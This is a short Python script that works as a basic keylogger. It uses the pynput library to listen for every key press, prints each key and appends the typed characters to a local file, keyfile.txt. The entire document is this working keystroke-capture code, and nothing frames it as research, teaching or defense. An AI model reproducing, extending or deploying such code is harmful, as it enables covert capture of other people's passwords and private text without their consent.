from pynput import keyboard

def keyPress(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)  # Fixed indentation
        except:
            print("Error getting character")
            logkey.write("Error getting character\n")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()